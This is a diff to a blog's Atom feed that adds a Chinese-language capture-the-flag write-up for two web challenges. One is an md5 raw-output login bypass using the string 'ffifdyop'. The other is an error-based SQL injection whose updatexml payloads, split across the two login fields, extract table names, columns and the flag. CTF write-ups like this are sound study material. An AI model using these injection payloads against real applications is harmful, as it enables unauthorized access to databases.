@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2018-04-01T04:53:11.962Z</updated>
+  <updated>2018-04-03T07:39:48.610Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,27 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>实验吧的艰辛奋斗web</title>
+    <link href="http://yoursite.com/2018/04/03/%E5%AE%9E%E9%AA%8C%E5%90%A7%E7%9A%84%E8%89%B0%E8%BE%9B%E5%A5%8B%E6%96%97web/"/>
+    <id>http://yoursite.com/2018/04/03/实验吧的艰辛奋斗web/</id>
+    <published>2018-04-03T06:36:04.000Z</published>
+    <updated>2018-04-03T07:39:48.610Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h1><p>打开后显示请用管理员密码进行登录，可能是sql注入，先随便试了一下万能密码 ‘ or ‘1’ =’1 不行。查看源代码发现有提示,sql语句如下<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = "<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">admin</span> <span class="keyword">WHERE</span> username = <span class="string">'admin'</span> <span class="keyword">and</span> <span class="keyword">password</span> = <span class="string">'".md5($password,true)."'</span><span class="string">";</span></span><br></pre></td></tr></table></figure></p><p>这里主要是个md5函数，百度了一下，说是true会返回16位原始二进制数据，但组成查询语句的时候会被转成字符串，那么就需要构造这样的payload<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = "<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">admin</span> <span class="keyword">WHERE</span> username = <span class="string">'admin'</span> <span class="keyword">and</span> <span class="keyword">password</span> = <span class="string">''</span> <span class="keyword">or</span> <span class="string">'xxx'</span><span class="string">";</span></span><br></pre></td></tr></table></figure></p><p>网上搜一个这样的字符 ffifdyop 输入拿到flag</p><h1 id="加了料的报错注入"><a href="#加了料的报错注入" class="headerlink" title="加了料的报错注入"></a>加了料的报错注入</h1><p>打开后是一个tip 意思就是传如post值在进行注入，查看页面源代码，有一条sql语句<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql="<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">'$username'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'$password'</span><span class="string">"</span></span><br></pre></td></tr></table></figure></p><p>先用万能语句绕过试试<br>username=1’&amp;password=or’1   成功，但是没有返回需要的信息 说明注入还是成功的<br>接下来继续测试 发现username中过滤了= # () password中过滤了= # updatexml 没有过滤()<br>这边学到了一个新思路 不能死在一个参数上 语句已经给你了 可以把中间给注释掉,由于过滤了等于号 这里使用regexp 绕过<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username=1' and updatexml<span class="comment">/*&amp;password=*/</span>(1,concat(0x3a,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema regexp <span class="keyword">database</span>()),<span class="number">0x3a</span>),<span class="number">1</span>) <span class="keyword">or</span> <span class="string">'1//ffll44jj</span></span><br><span class="line"><span class="string">username=1'</span> <span class="keyword">and</span> updatexml<span class="comment">/*&amp;password=*/</span>(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name regexp <span class="string">'ffll44jj'</span>),<span class="number">0x3a</span>),<span class="number">1</span>) <span class="keyword">or</span> <span class="string">'1 //value</span></span><br><span class="line"><span class="string">username=1'</span> <span class="keyword">and</span> updatexml<span class="comment">/*&amp;password=*/</span>(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">value</span> <span class="keyword">from</span> ffll44jj),<span class="number">0x3a</span>),<span class="number">1</span>) <span class="keyword">or</span> <span class="string">'1</span></span><br></pre></td></tr></table></figure></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;后台登录&quot;&gt;&lt;a href=&quot;#后台登录&quot; class=&quot;headerlink&quot; title=&quot;后台登录&quot;&gt;&lt;/a&gt;后台登录&lt;/h1&gt;&lt;p&gt;打开后显示请用管理员密码进行登录，可能是sql注入，先随便试了一下万能密码 ‘ or ‘1’ =’1 不行。查看源代码发现有
+      
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>bugku web writeup</title>
